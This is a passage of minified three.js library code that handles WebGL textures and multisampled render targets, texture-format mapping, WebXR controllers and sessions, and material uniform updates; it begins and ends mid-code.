ht=A.isWebGLCubeRenderTarget?i.TEXTURE_CUBE_MAP:i.TEXTURE_2D,ot=n.get(tt).__webglTexture;e.bindTexture(ht,ot),_(ht),e.unbindTexture()}}}function vt(A){if(a&&A.samples>0&&ft(A)===!1){const M=A.isWebGLMultipleRenderTargets?A.texture:[A.texture],O=A.width,Q=A.height;let Z=i.COLOR_BUFFER_BIT;const tt=[],ht=A.stencilBuffer?i.DEPTH_STENCIL_ATTACHMENT:i.DEPTH_ATTACHMENT,ot=n.get(A),ct=A.isWebGLMultipleRenderTargets===!0;if(ct)for(let yt=0;yt<M.length;yt++)e.bindFramebuffer(i.FRAMEBUFFER,ot.__webglMultisampledFramebuffer),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+yt,i.RENDERBUFFER,null),e.bindFramebuffer(i.FRAMEBUFFER,ot.__webglFramebuffer),i.framebufferTexture2D(i.DRAW_FRAMEBUFFER,i.COLOR_ATTACHMENT0+yt,i.TEXTURE_2D,null,0);e.bindFramebuffer(i.READ_FRAMEBUFFER,ot.__webglMultisampledFramebuffer),e.bindFramebuffer(i.DRAW_FRAMEBUFFER,ot.__webglFramebuffer);for(let yt=0;yt<M.length;yt++){tt.push(i.COLOR_ATTACHMENT0+yt),A.depthBuffer&&tt.push(ht);const Dt=ot.__ignoreDepthValues!==void 0?ot.__ignoreDepthValues:!1;if(Dt===!1&&(A.depthBuffer&&(Z|=i.DEPTH_BUFFER_BIT),A.stencilBuffer&&(Z|=i.STENCIL_BUFFER_BIT)),ct&&i.framebufferRenderbuffer(i.READ_FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.RENDERBUFFER,ot.__webglColorRenderbuffer[yt]),Dt===!0&&(i.invalidateFramebuffer(i.READ_FRAMEBUFFER,[ht]),i.invalidateFramebuffer(i.DRAW_FRAMEBUFFER,[ht])),ct){const $=n.get(M[yt]).__webglTexture;i.framebufferTexture2D(i.DRAW_FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.TEXTURE_2D,$,0)}i.blitFramebuffer(0,0,O,Q,0,0,O,Q,Z,i.NEAREST),c&&i.invalidateFramebuffer(i.READ_FRAMEBUFFER,tt)}if(e.bindFramebuffer(i.READ_FRAMEBUFFER,null),e.bindFramebuffer(i.DRAW_FRAMEBUFFER,null),ct)for(let yt=0;yt<M.length;yt++){e.bindFramebuffer(i.FRAMEBUFFER,ot.__webglMultisampledFramebuffer),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+yt,i.RENDERBUFFER,ot.__webglColorRenderbuffer[yt]);const Dt=n.get(M[yt]).__webglTexture;e.bindFramebuffer(i.FRAMEBUFFER,ot.__webglFramebuffer),i.framebufferTexture2D(i.DRAW_FRAMEBUFFER,i.COLOR_ATTACHMENT0+yt,i.TEXTURE_2D,Dt,0)}e.bindFramebuffer(i.DRAW_FRAMEBUFFER,ot.__webglMultisampledFramebuffer)}}function Rt(A){return Math.min(r.maxSamples,A.samples)}function ft(A){const M=n.get(A);return a&&A.samples>0&&t.has("WEBGL_multisampled_render_to_texture")===!0&&M.__useRenderToTexture!==!1}function $t(A){const M=o.render.frame;u.get(A)!==M&&(u.set(A,M),A.update())}function Lt(A,M){const O=A.colorSpace,Q=A.format,Z=A.type;return A.isCompressedTexture===!0||A.isVideoTexture===!0||A.format===Qr||O!==Ze&&O!==Pe&&(Wt.getTransfer(O)===jt?a===!1?t.has("EXT_sRGB")===!0&&Q===ke?(A.format=Qr,A.minFilter=we,A.generateMipmaps=!1):M=ho.sRGBToLinear(M):(Q!==ke||Z!==ln)&&console.warn("THREE.WebGLTextures: sRGB encoded textures have to use RGBAFormat and UnsignedByteType."):console.error("THREE.WebGLTextures: Unsupported texture color space:",O)),M}this.allocateTextureUnit=P,this.resetTextureUnits=et,this.setTexture2D=W,this.setTexture2DArray=Y,this.setTexture3D=H,this.setTextureCube=V,this.rebindTextures=Ut,this.setupRenderTarget=N,this.updateRenderTargetMipmap=ne,this.updateMultisampleRenderTarget=vt,this.setupDepthRenderbuffer=gt,this.setupFrameBufferTexture=ut,this.useMultisampledRTT=ft}function Vf(i,t,e){const n=e.isWebGL2;function r(s,o=Pe){let a;const l=Wt.getTransfer(o);if(s===ln)return i.UNSIGNED_BYTE;if(s===ro)return i.UNSIGNED_SHORT_4_4_4_4;if(s===so)return i.UNSIGNED_SHORT_5_5_5_1;if(s===Ml)return i.BYTE;if(s===Sl)return i.SHORT;if(s===as)return i.UNSIGNED_SHORT;if(s===io)return i.INT;if(s===rn)return i.UNSIGNED_INT;if(s===sn)return i.FLOAT;if(s===hi)return n?i.HALF_FLOAT:(a=t.get("OES_texture_half_float"),a!==null?a.HALF_FLOAT_OES:null);if(s===bl)return i.ALPHA;if(s===ke)return i.RGBA;if(s===Tl)return i.LUMINANCE;if(s===Al)return i.LUMINANCE_ALPHA;if(s===Mn)return i.DEPTH_COMPONENT;if(s===Zn)return i.DEPTH_STENCIL;if(s===Qr)return a=t.get("EXT_sRGB"),a!==null?a.SRGB_ALPHA_EXT:null;if(s===Rl)return i.RED;if(s===ao)return i.RED_INTEGER;if(s===wl)return i.RG;if(s===oo)return i.RG_INTEGER;if(s===lo)return i.RGBA_INTEGER;if(s===ur||s===pr||s===fr||s===hr)if(l===jt)if(a=t.get("WEBGL_compressed_texture_s3tc_srgb"),a!==null){if(s===ur)return a.COMPRESSED_SRGB_S3TC_DXT1_EXT;if(s===pr)return a.COMPRESSED_SRGB_ALPHA_S3TC_DXT1_EXT;if(s===fr)return a.COMPRESSED_SRGB_ALPHA_S3TC_DXT3_EXT;if(s===hr)return a.COMPRESSED_SRGB_ALPHA_S3TC_DXT5_EXT}else return null;else if(a=t.get("WEBGL_compressed_texture_s3tc"),a!==null){if(s===ur)return a.COMPRESSED_RGB_S3TC_DXT1_EXT;if(s===pr)return a.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(s===fr)return a.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(s===hr)return a.COMPRESSED_RGBA_S3TC_DXT5_EXT}else return null;if(s===Rs||s===ws||s===Cs||s===Ps)if(a=t.get("WEBGL_compressed_texture_pvrtc"),a!==null){if(s===Rs)return a.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(s===ws)return a.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(s===Cs)return a.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(s===Ps)return a.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}else return null;if(s===co)return a=t.get("WEBGL_compressed_texture_etc1"),a!==null?a.COMPRESSED_RGB_ETC1_WEBGL:null;if(s===Is||s===Ls)if(a=t.get("WEBGL_compressed_texture_etc"),a!==null){if(s===Is)return l===jt?a.COMPRESSED_SRGB8_ETC2:a.COMPRESSED_RGB8_ETC2;if(s===Ls)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ETC2_EAC:a.COMPRESSED_RGBA8_ETC2_EAC}else return null;if(s===Ds||s===Ns||s===Us||s===Os||s===Fs||s===ks||s===Bs||s===zs||s===Gs||s===Hs||s===Vs||s===Ws||s===Xs||s===qs)if(a=t.get("WEBGL_compressed_texture_astc"),a!==null){if(s===Ds)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_4x4_KHR:a.COMPRESSED_RGBA_ASTC_4x4_KHR;if(s===Ns)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_5x4_KHR:a.COMPRESSED_RGBA_ASTC_5x4_KHR;if(s===Us)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_5x5_KHR:a.COMPRESSED_RGBA_ASTC_5x5_KHR;if(s===Os)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_6x5_KHR:a.COMPRESSED_RGBA_ASTC_6x5_KHR;if(s===Fs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_6x6_KHR:a.COMPRESSED_RGBA_ASTC_6x6_KHR;if(s===ks)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_8x5_KHR:a.COMPRESSED_RGBA_ASTC_8x5_KHR;if(s===Bs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_8x6_KHR:a.COMPRESSED_RGBA_ASTC_8x6_KHR;if(s===zs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_8x8_KHR:a.COMPRESSED_RGBA_ASTC_8x8_KHR;if(s===Gs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x5_KHR:a.COMPRESSED_RGBA_ASTC_10x5_KHR;if(s===Hs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x6_KHR:a.COMPRESSED_RGBA_ASTC_10x6_KHR;if(s===Vs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x8_KHR:a.COMPRESSED_RGBA_ASTC_10x8_KHR;if(s===Ws)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x10_KHR:a.COMPRESSED_RGBA_ASTC_10x10_KHR;if(s===Xs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_12x10_KHR:a.COMPRESSED_RGBA_ASTC_12x10_KHR;if(s===qs)return l===jt?a.COMPRESSED_SRGB8_ALPHA8_ASTC_12x12_KHR:a.COMPRESSED_RGBA_ASTC_12x12_KHR}else return null;if(s===mr||s===Ys||s===js)if(a=t.get("EXT_texture_compression_bptc"),a!==null){if(s===mr)return l===jt?a.COMPRESSED_SRGB_ALPHA_BPTC_UNORM_EXT:a.COMPRESSED_RGBA_BPTC_UNORM_EXT;if(s===Ys)return a.COMPRESSED_RGB_BPTC_SIGNED_FLOAT_EXT;if(s===js)return a.COMPRESSED_RGB_BPTC_UNSIGNED_FLOAT_EXT}else return null;if(s===Cl||s===$s||s===Ks||s===Zs)if(a=t.get("EXT_texture_compression_rgtc"),a!==null){if(s===mr)return a.COMPRESSED_RED_RGTC1_EXT;if(s===$s)return a.COMPRESSED_SIGNED_RED_RGTC1_EXT;if(s===Ks)return a.COMPRESSED_RED_GREEN_RGTC2_EXT;if(s===Zs)return a.COMPRESSED_SIGNED_RED_GREEN_RGTC2_EXT}else return null;return s===yn?n?i.UNSIGNED_INT_24_8:(a=t.get("WEBGL_depth_texture"),a!==null?a.UNSIGNED_INT_24_8_WEBGL:null):i[s]!==void 0?i[s]:null}return{convert:r}}class Wf extends Ce{constructor(t=[]){super(),this.isArrayCamera=!0,this.cameras=t}}class En extends ye{constructor(){super(),this.isGroup=!0,this.type="Group"}}const Xf={type:"move"};class zr{constructor(){this._targetRay=null,this._grip=null,this._hand=null}getHandSpace(){return this._hand===null&&(this._hand=new En,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}getTargetRaySpace(){return this._targetRay===null&&(this._targetRay=new En,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new L,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new L),this._targetRay}getGripSpace(){return this._grip===null&&(this._grip=new En,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new L,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new L),this._grip}dispatchEvent(t){return this._targetRay!==null&&this._targetRay.dispatchEvent(t),this._grip!==null&&this._grip.dispatchEvent(t),this._hand!==null&&this._hand.dispatchEvent(t),this}connect(t){if(t&&t.hand){const e=this._hand;if(e)for(const n of t.hand.values())this._getHandJoint(e,n)}return this.dispatchEvent({type:"connected",data:t}),this}disconnect(t){return this.dispatchEvent({type:"disconnected",data:t}),this._targetRay!==null&&(this._targetRay.visible=!1),this._grip!==null&&(this._grip.visible=!1),this._hand!==null&&(this._hand.visible=!1),this}update(t,e,n){let r=null,s=null,o=null;const a=this._targetRay,l=this._grip,c=this._hand;if(t&&e.session.visibilityState!=="visible-blurred"){if(c&&t.hand){o=!0;for(const x of t.hand.values()){const f=e.getJointPose(x,n),d=this._getHandJoint(c,x);f!==null&&(d.matrix.fromArray(f.transform.matrix),d.matrix.decompose(d.position,d.rotation,d.scale),d.matrixWorldNeedsUpdate=!0,d.jointRadius=f.radius),d.visible=f!==null}const u=c.joints["index-finger-tip"],h=c.joints["thumb-tip"],p=u.position.distanceTo(h.position),m=.02,E=.005;c.inputState.pinching&&p>m+E?(c.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:t.handedness,target:this})):!c.inputState.pinching&&p<=m-E&&(c.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:t.handedness,target:this}))}else l!==null&&t.gripSpace&&(s=e.getPose(t.gripSpace,n),s!==null&&(l.matrix.fromArray(s.transform.matrix),l.matrix.decompose(l.position,l.rotation,l.scale),l.matrixWorldNeedsUpdate=!0,s.linearVelocity?(l.hasLinearVelocity=!0,l.linearVelocity.copy(s.linearVelocity)):l.hasLinearVelocity=!1,s.angularVelocity?(l.hasAngularVelocity=!0,l.angularVelocity.copy(s.angularVelocity)):l.hasAngularVelocity=!1));a!==null&&(r=e.getPose(t.targetRaySpace,n),r===null&&s!==null&&(r=s),r!==null&&(a.matrix.fromArray(r.transform.matrix),a.matrix.decompose(a.position,a.rotation,a.scale),a.matrixWorldNeedsUpdate=!0,r.linearVelocity?(a.hasLinearVelocity=!0,a.linearVelocity.copy(r.linearVelocity)):a.hasLinearVelocity=!1,r.angularVelocity?(a.hasAngularVelocity=!0,a.angularVelocity.copy(r.angularVelocity)):a.hasAngularVelocity=!1,this.dispatchEvent(Xf)))}return a!==null&&(a.visible=r!==null),l!==null&&(l.visible=s!==null),c!==null&&(c.visible=o!==null),this}_getHandJoint(t,e){if(t.joints[e.jointName]===void 0){const n=new En;n.matrixAutoUpdate=!1,n.visible=!1,t.joints[e.jointName]=n,t.add(n)}return t.joints[e.jointName]}}class qf extends Qn{constructor(t,e){super();const n=this;let r=null,s=1,o=null,a="local-floor",l=1,c=null,u=null,h=null,p=null,m=null,E=null;const x=e.getContextAttributes();let f=null,d=null;const g=[],_=[],v=new zt;let w=null;const S=new Ce;S.layers.enable(1),S.viewport=new ce;const T=new Ce;T.layers.enable(2),T.viewport=new ce;const D=[S,T],y=new Wf;y.layers.enable(1),y.layers.enable(2);let R=null,k=null;this.cameraAutoUpdate=!0,this.enabled=!1,this.isPresenting=!1,this.getController=function(G){let j=g[G];return j===void 0&&(j=new zr,g[G]=j),j.getTargetRaySpace()},this.getControllerGrip=function(G){let j=g[G];return j===void 0&&(j=new zr,g[G]=j),j.getGripSpace()},this.getHand=function(G){let j=g[G];return j===void 0&&(j=new zr,g[G]=j),j.getHandSpace()};function X(G){const j=_.indexOf(G.inputSource);if(j===-1)return;const rt=g[j];rt!==void 0&&(rt.update(G.inputSource,G.frame,c||o),rt.dispatchEvent({type:G.type,data:G.inputSource}))}function et(){r.removeEventListener("select",X),r.removeEventListener("selectstart",X),r.removeEventListener("selectend",X),r.removeEventListener("squeeze",X),r.removeEventListener("squeezestart",X),r.removeEventListener("squeezeend",X),r.removeEventListener("end",et),r.removeEventListener("inputsourceschange",P);for(let G=0;G<g.length;G++){const j=_[G];j!==null&&(_[G]=null,g[G].disconnect(j))}R=null,k=null,t.setRenderTarget(f),m=null,p=null,h=null,r=null,d=null,K.stop(),n.isPresenting=!1,t.setPixelRatio(w),t.setSize(v.width,v.height,!1),n.dispatchEvent({type:"sessionend"})}this.setFramebufferScaleFactor=function(G){s=G,n.isPresenting===!0&&console.warn("THREE.WebXRManager: Cannot change framebuffer scale while presenting.")},this.setReferenceSpaceType=function(G){a=G,n.isPresenting===!0&&console.warn("THREE.WebXRManager: Cannot change reference space type while presenting.")},this.getReferenceSpace=function(){return c||o},this.setReferenceSpace=function(G){c=G},this.getBaseLayer=function(){return p!==null?p:m},this.getBinding=function(){return h},this.getFrame=function(){return E},this.getSession=function(){return r},this.setSession=async function(G){if(r=G,r!==null){if(f=t.getRenderTarget(),r.addEventListener("select",X),r.addEventListener("selectstart",X),r.addEventListener("selectend",X),r.addEventListener("squeeze",X),r.addEventListener("squeezestart",X),r.addEventListener("squeezeend",X),r.addEventListener("end",et),r.addEventListener("inputsourceschange",P),x.xrCompatible!==!0&&await e.makeXRCompatible(),w=t.getPixelRatio(),t.getSize(v),r.renderState.layers===void 0||t.capabilities.isWebGL2===!1){const j={antialias:r.renderState.layers===void 0?x.antialias:!0,alpha:!0,depth:x.depth,stencil:x.stencil,framebufferScaleFactor:s};m=new XRWebGLLayer(r,e,j),r.updateRenderState({baseLayer:m}),t.setPixelRatio(1),t.setSize(m.framebufferWidth,m.framebufferHeight,!1),d=new Tn(m.framebufferWidth,m.framebufferHeight,{format:ke,type:ln,colorSpace:t.outputColorSpace,stencilBuffer:x.stencil})}else{let j=null,rt=null,pt=null;x.depth&&(pt=x.stencil?e.DEPTH24_STENCIL8:e.DEPTH_COMPONENT24,j=x.stencil?Zn:Mn,rt=x.stencil?yn:rn);const ut={colorFormat:e.RGBA8,depthFormat:pt,scaleFactor:s};h=new XRWebGLBinding(r,e),p=h.createProjectionLayer(ut),r.updateRenderState({layers:[p]}),t.setPixelRatio(1),t.setSize(p.textureWidth,p.textureHeight,!1),d=new Tn(p.textureWidth,p.textureHeight,{format:ke,type:ln,depthTexture:new To(p.textureWidth,p.textureHeight,rt,void 0,void 0,void 0,void 0,void 0,void 0,j),stencilBuffer:x.stencil,colorSpace:t.outputColorSpace,samples:x.antialias?4:0});const St=t.properties.get(d);St.__ignoreDepthValues=p.ignoreDepthValues}d.isXRRenderTarget=!0,this.setFoveation(l),c=null,o=await r.requestReferenceSpace(a),K.setContext(r),K.start(),n.isPresenting=!0,n.dispatchEvent({type:"sessionstart"})}},this.getEnvironmentBlendMode=function(){if(r!==null)return r.environmentBlendMode};function P(G){for(let j=0;j<G.removed.length;j++){const rt=G.removed[j],pt=_.indexOf(rt);pt>=0&&(_[pt]=null,g[pt].disconnect(rt))}for(let j=0;j<G.added.length;j++){const rt=G.added[j];let pt=_.indexOf(rt);if(pt===-1){for(let St=0;St<g.length;St++)if(St>=_.length){_.push(rt),pt=St;break}else if(_[St]===null){_[St]=rt,pt=St;break}if(pt===-1)break}const ut=g[pt];ut&&ut.connect(rt)}}const B=new L,W=new L;function Y(G,j,rt){B.setFromMatrixPosition(j.matrixWorld),W.setFromMatrixPosition(rt.matrixWorld);const pt=B.distanceTo(W),ut=j.projectionMatrix.elements,St=rt.projectionMatrix.elements,Tt=ut[14]/(ut[10]-1),gt=ut[14]/(ut[10]+1),Ut=(ut[9]+1)/ut[5],N=(ut[9]-1)/ut[5],ne=(ut[8]-1)/ut[0],vt=(St[8]+1)/St[0],Rt=Tt*ne,ft=Tt*vt,$t=pt/(-ne+vt),Lt=$t*-ne;j.matrixWorld.decompose(G.position,G.quaternion,G.scale),G.translateX(Lt),G.translateZ($t),G.matrixWorld.compose(G.position,G.quaternion,G.scale),G.matrixWorldInverse.copy(G.matrixWorld).invert();const A=Tt+$t,M=gt+$t,O=Rt-Lt,Q=ft+(pt-Lt),Z=Ut*gt/M*A,tt=N*gt/M*A;G.projectionMatrix.makePerspective(O,Q,Z,tt,A,M),G.projectionMatrixInverse.copy(G.projectionMatrix).invert()}function H(G,j){j===null?G.matrixWorld.copy(G.matrix):G.matrixWorld.multiplyMatrices(j.matrixWorld,G.matrix),G.matrixWorldInverse.copy(G.matrixWorld).invert()}this.updateCamera=function(G){if(r===null)return;y.near=T.near=S.near=G.near,y.far=T.far=S.far=G.far,(R!==y.near||k!==y.far)&&(r.updateRenderState({depthNear:y.near,depthFar:y.far}),R=y.near,k=y.far);const j=G.parent,rt=y.cameras;H(y,j);for(let pt=0;pt<rt.length;pt++)H(rt[pt],j);rt.length===2?Y(y,S,T):y.projectionMatrix.copy(S.projectionMatrix),V(G,y,j)};function V(G,j,rt){rt===null?G.matrix.copy(j.matrixWorld):(G.matrix.copy(rt.matrixWorld),G.matrix.invert(),G.matrix.multiply(j.matrixWorld)),G.matrix.decompose(G.position,G.quaternion,G.scale),G.updateMatrixWorld(!0),G.projectionMatrix.copy(j.projectionMatrix),G.projectionMatrixInverse.copy(j.projectionMatrixInverse),G.isPerspectiveCamera&&(G.fov=ts*2*Math.atan(1/G.projectionMatrix.elements[5]),G.zoom=1)}this.getCamera=function(){return y},this.getFoveation=function(){if(!(p===null&&m===null))return l},this.setFoveation=function(G){l=G,p!==null&&(p.fixedFoveation=G),m!==null&&m.fixedFoveation!==void 0&&(m.fixedFoveation=G)};let q=null;function J(G,j){if(u=j.getViewerPose(c||o),E=j,u!==null){const rt=u.views;m!==null&&(t.setRenderTargetFramebuffer(d,m.framebuffer),t.setRenderTarget(d));let pt=!1;rt.length!==y.cameras.length&&(y.cameras.length=0,pt=!0);for(let ut=0;ut<rt.length;ut++){const St=rt[ut];let Tt=null;if(m!==null)Tt=m.getViewport(St);else{const Ut=h.getViewSubImage(p,St);Tt=Ut.viewport,ut===0&&(t.setRenderTargetTextures(d,Ut.colorTexture,p.ignoreDepthValues?void 0:Ut.depthStencilTexture),t.setRenderTarget(d))}let gt=D[ut];gt===void 0&&(gt=new Ce,gt.layers.enable(ut),gt.viewport=new ce,D[ut]=gt),gt.matrix.fromArray(St.transform.matrix),gt.matrix.decompose(gt.position,gt.quaternion,gt.scale),gt.projectionMatrix.fromArray(St.projectionMatrix),gt.projectionMatrixInverse.copy(gt.projectionMatrix).invert(),gt.viewport.set(Tt.x,Tt.y,Tt.width,Tt.height),ut===0&&(y.matrix.copy(gt.matrix),y.matrix.decompose(y.position,y.quaternion,y.scale)),pt===!0&&y.cameras.push(gt)}}for(let rt=0;rt<g.length;rt++){const pt=_[rt],ut=g[rt];pt!==null&&ut!==void 0&&ut.update(pt,j,c||o)}q&&q(G,j),j.detectedPlanes&&n.dispatchEvent({type:"planesdetected",data:j}),E=null}const K=new bo;K.setAnimationLoop(J),this.setAnimationLoop=function(G){q=G},this.dispose=function(){}}}function Yf(i,t){function e(f,d){f.matrixAutoUpdate===!0&&f.updateMatrix(),d.value.copy(f.matrix)}function n(f,d){d.color.getRGB(f.fogColor.value,Eo(i)),d.isFog?(f.fogNear.value=d.near,f.fogFar.value=d.far):d.isFogExp2&&(f.fogDensity.value=d.density)}function r(f,d,g,_,v){d.isMeshBasicMaterial||d.isMeshLambertMaterial?s(f,d):d.isMeshToonMaterial?(s(f,d),h(f,d)):d.isMeshPhongMaterial?(s(f,d),u(f,d)):d.isMeshStandardMaterial?(s(f,d),p(f,d),d.isMeshPhysicalMaterial&&m(f,d,v)):d.isMeshMatcapMaterial?(s(f,d),E(f,d)):d.isMeshDepthMaterial?s(f,d):d.isMeshDistanceMaterial?(s(f,d),x(f,d)):d.isMeshNormalMaterial?s(f,d):d.isLineBasicMaterial?(o(f,d),d.isLineDashedMaterial&&a(f,d)):d.isPointsMaterial?l(f,d,g,_):d.isSpriteMaterial?c(f,d):d.isShadowMaterial?(f.color.value.copy(d.color),f.opacity.value=d.opacity):d.isShaderMaterial&&(d.uniformsNeedUpdate=!1)}function s(f,d){f.opacity.value=d.opacity,d.color&&f.diffuse.value.copy(d.color),d.emissive&&f.emissive.value.copy(d.emissive).multiplyScalar(d.emissiveIntensity),d.map&&(f.map.value=d.map,e(d.map,f.mapTransform)),d.alphaMap&&(f.alphaMap.value=d.alphaMap,e(d.alphaMap,f.alphaMapTransform)),d.bumpMap&&(f.bumpMap.value=d.bumpMap,e(d.bumpMap,f.bumpMapTransform),f.bumpScale.value=d.bumpScale,d.side===Ee&&(f.bumpScale.value*=-1)),d.normalMap&&(f.normalMap.value=d.normalMap,e(d.normalMap,f.normalMapTransform),f.normalScale.value.copy(d.normalScale),d.side===Ee&&f.normalScale.value.negate()),d.displacementMap&&(f.displacementMap.value=d.displacementMap,e(d.displacementMap,f.displacementMapTransform),f.displacementScale.value=d.displacementScale,f.displacementBias.value=d.displacementBias),d.emissiveMap&&(f.emissiveMap.value=d.emissiveMap,e(d.emissiveMap,f.emissiveMapTransform)),d.specularMap&&(f.specularMap.value=d.specularMap,e(d.specularMap,f.specularMapTransform)),d.alphaTest>0&&(f.alphaTest.value=d.alphaTest);const g=t.get(d).envMap;if(g&&(f.envMap.value=g,f.flipEnvMap.value=g.isCubeTexture&&g.isRenderTargetTexture===!1?-1:1,f.reflectivity.value=d.reflectivity,f.ior.value=d.ior,f.refractionRatio.value=d.refractionRatio),d.lightMap){f.lightMap.value=d.lightMap;const _=i._useLegacyLights===!0?Math.PI:1;f.lightMapIntensity.value=d.lightMapIntensity*_,e(d.lightMap,f.lightMapTransform)}d.aoMap&&(f.aoMap.value=d.aoMap,f.aoMapIntensity.value=d.aoMapIntensity,e(d.aoMap,f.aoMapTransform))}function o(f,d){f.diffuse.value.copy(d.color),f.opacity.value=d.opacity,d.map&&(f.map.value=d.map,e(d.map,f.mapTransform))}function a(f,d){f.dashSize.value=d.dashSize,f.totalSize.value=d.dashSize+d.gapSize,f.scale.value=d.scale}function l(f,d,g,_){f.diffuse.value.copy(d.color),f.opacity.value=d.opacity,f.size.value=d.size*g,f.scale.value=_*.5,d.map&&(f.map.value=d.map,e(d.map,f.uvTransform)),d.alphaMap&&(f.alphaMap.value=d.alphaMap,e(d.alphaMap,f.alphaMapTransform)),d.alphaTest>0&&(f.alphaTest.value=d.alphaTest)}function c(f,d){f.diffuse.value.copy(d.color),f.opacity.value=d.opacity,f.rotation.value=d.rotation,d.map&&(f.map.value=d.map,e(d.map,f.mapTransform)),d.alphaMap&&(f.alphaMap.value=d.alphaMap,e(d.alphaMap,f.alphaMapTransform)),d.alphaTest>0&&(f.alphaTest.value=d.alphaTest)}function u(f,d){f.specular.value.copy(d.specular),f.shininess.value=Math.max(d.shininess,1e-4)}function h(f,d){d.gradientMap&&(f.gradientMap.value=d.gradientMap)}function p(f,d){f.metalness.value=d.metalness,d.metalnessMap&&(f.metalnessMap.value=d.metalnessMap,e(d.metalnessMap,f.metalnessMapTransform)),f.roughness.value=d.roughness,d.roughnessMap&&(f.roughnessMap.value=d.roughnessMap,e(d.roughnessMap,f.roughnessMapTransform)),t.get(d).envMap&&(f.envMapIntensity.value=d.envMapIntensity)}function m(f,d,g){f.ior.value=d.ior,d.sheen>0&&(f.sheenColor.value.copy(d.sheenColor).multiplyScalar(d.sheen),f.sheenRoughness.value=d.sheenRoughness,d.sheenColorMap&&(f.sheenColorMap.value=d.sheenColorMap,e(d.sheenColorMap,f.sheenColorMapTransform)),d.sheenRoughnessMap&&(f.sheenRoughnessMap.value=d.sheenRoughnessMap,e(d.sheenRoughnessMap,f.sheenRoughnessMapTransform))),d.clearcoat>0&&(f.clearcoat.value=d.clearcoat,f.clearcoatRoughness.value=d.clearcoatRoughness,d.clearcoatMap&&(f.clearcoatMap.value=d.clearcoatMap,e(d.clearcoatMap,f.clearcoatMapTransform)),d.clearcoatRoughnessMap&&(f.clearcoatRoughnessMap.value=d.clearcoatRoughnessMap,e(d.clearcoatRoughnessMap,f.clearcoatRoughnessMapTransform)),d.clearcoatNormalMap&&(f.clearcoatNormalMap.value=d.clearcoatNormalMap,e(d.clearcoatNormalMap,f.clearcoatNormalMapTransform),f.clearcoatNormalScale.value.copy(d.clearcoatNormalScale),d.side===Ee&&f.clearcoatNormalScale.value.negate())),d.iridescence>0&&(f.iridescence.value=d.iridescence,f.iridescenceIOR.value=d.iridescenceIOR,f.iridescenceThicknessMinimum.value=d.iridescenceThicknessRange[0],f.iridescenceThicknessMaximum.value=d.iridescenceThicknessRange[1],d.iridescenceMap&&(f.iridescenceMap.value=d.iridescenceMap,e(d.iridescenceMap,f.iridescenceMapTransform)),d.iridescenceThicknessMap&&(f.iridescenceThicknessMap.value=d.iridescenceThicknessMap,e(d.iridescenceThicknessMap,f.iridescenceThicknessMapTransform))),d.transmission>0&&(f.transmission.value=d.transmission,f.transmissionSamplerMap.value=g.texture,f.transmissionSamplerSize.value.set(g.width,g.height),d.transmissionMap&&(f.transmissionMap.value=d.transmissionMap,e(d.transmissionMap,f.transmissionMapTransform)),f.thickness.value=d.thickness,d.thicknessMap&&(f.thicknessMap.value=d.thicknessMap,e(d.thicknessMap,f.thicknessMapTransform)),f.attenuationDistance.value=d.attenuationDistance,f.attenuationColor.value.copy(d.attenuationColor)),d.anisotropy>0&&(f.anisotropyVector.value.set(d.anisotropy*Math.cos(d.anisotropyRotation),d.anisotropy*Math.sin(d.anisotropyRotation)),d.anisotropyMap&&(f.anisotropyMap.value=d.anisotropyMap,e(d.anisotropyMap,f.anisotropyMapTransform))),f.specularIntensity.value=d.specularIntensity,f.specularColor.value.copy(d.specularColor),d.specularColorMap&&(f.specularColorMap.value=d.specularColorMap,e(d.specularColorMap,f.specularColorMapTransform)),d.specularIntensityMap&&(f.specularIntensityMap.value=d.specularIntensityMap,e(d.specularIntensityMap,f.specularIntensityMapTransform))}function E(f,d){d.matcap&&(f.matcap.value=d.matcap)}function x(f,d){const g=t.get(d).light;f.referencePosition.value.setFromMatrixPosition(g.matrixWorld),f.nearDistance.value=g.shadow.camera.near,f.farDistance.value=g.shadow.camera.far}return{refreshFogUniforms:n,refreshMaterialUniforms:r}}function jf(i,t,e,n){let r={},s={},o=[];const a=e.isWebGL2?i.getParameter(i.MAX_UNIFORM_BUFFER_BINDINGS):0;function l(g,_){const v=_.program;n.uniformBlockBinding(g,v)}function c(g,_){let v=r[g.id];v===void 0&&(E(g),v=u(g),r[g.id]=v,g.addEventListener("dispose",f));const w=_.program;n.updateUBOMapping(g,w);const S=t.render.frame;s[g.id]!==S&&(p(g),s[g.id]=S)}function u(g){const _=h();g.__bindingPointIndex=_;const 